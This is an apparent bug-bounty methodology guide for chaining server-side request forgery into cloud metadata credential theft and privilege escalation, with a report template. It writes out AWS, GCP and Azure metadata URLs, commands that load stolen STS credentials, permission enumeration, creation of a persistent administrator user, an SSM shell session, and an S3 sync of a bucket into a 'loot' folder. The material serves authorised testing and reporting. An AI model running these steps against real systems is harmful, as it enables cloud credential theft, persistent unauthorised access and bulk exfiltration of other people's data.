SSRF to Cloud Metadata to RCE
Why This Chain Works
SSRF alone is a medium at best unless you can show impact. Hitting the cloud metadata endpoint changes everything. You get IAM credentials that were provisioned for the instance. From there it's a permissions enumeration game and more often than not the instance has overpermissioned roles because devs give it admin access during testing and never lock it down.

Step-by-Step
1. Confirm the SSRF
Find parameters that trigger server-side requests: url=, webhook=, fetch=, import=, dest=, image URL fields, PDF generators, XML parsers. Confirm with a Burp Collaborator callback or interactsh. Then pivot to internal addresses.
2. Hit the Metadata Endpoints
AWS:
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data/
IMDSv2 blocks simple GET requests. If you get a 401, try the two-step token flow via SSRF (PUT to get a token, then GET with that token in the header). Many targets haven't enforced IMDSv2 everywhere.
GCP:
metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
metadata.google.internal/computeMetadata/v1/project/project-id
Requires Metadata-Flavor: Google header. If you can set headers in your SSRF, send it. If not, check if the app reflects custom headers.
Azure:
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=management.azure.com/
Requires Metadata: true header.
3. Extract the Credentials
AWS response looks like:
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2026-01-01T00:00:00Z"
}
These are temporary STS credentials tied to the instance role. They expire but rotate, so act fast.
4. Configure and Enumerate
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
 
# Who am I?
aws sts get-caller-identity
 
# What can I do? (bruteforce via enumerate-iam)
python3 enumerate-iam.py --access-key $AWS_ACCESS_KEY_ID \
  --secret-key $AWS_SECRET_ACCESS_KEY \
  --session-token $AWS_SESSION_TOKEN
5. Escalation Paths
If you have iam:CreateUser + iam:AttachUserPolicy:
aws iam create-user --user-name pwned-user
aws iam attach-user-policy --user-name pwned-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name pwned-user
Persistent admin access. Done.
If you have lambda:CreateFunction + lambda:InvokeFunction + iam:PassRole:
# Deploy a Lambda with a role that has more perms
# Invoke it to execute arbitrary code in that role's context
If you have ec2:DescribeInstances + ssm:StartSession:
aws ssm start-session --target i-INSTANCEID
# Shell on the instance
If you have S3 read access:
aws s3 ls s3://
aws s3 sync s3://interesting-bucket ./loot/
# Look for .env files, db backups, source code, other credentials

PoC Template for Report
1. SSRF trigger: POST /api/render with body {"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
2. Response contains role name: "app-prod-role"
3. Second request to /app-prod-role returns AccessKeyId, SecretAccessKey, Token
4. aws sts get-caller-identity confirms identity: arn:aws:iam::123456789:assumed-role/app-prod-role/i-abc123
5. enumerate-iam output attached showing iam:CreateUser permission
6. Created test user "bb-test-DO-NOT-USE" and immediately deleted it to prove admin access
Always create and delete a benign test resource. Don't just claim you have the permissions, show the API call that proves it.

Reporting Notes
The SSRF is the entry point. The cloud credential theft is the escalation. The permissions enumeration is what determines final severity. Show the full chain in the report: SSRF request, metadata response (redacted creds), identity confirmation, and one proof-of-impact action. Severity lands at Critical if you can show any persistent access or data exfiltration.
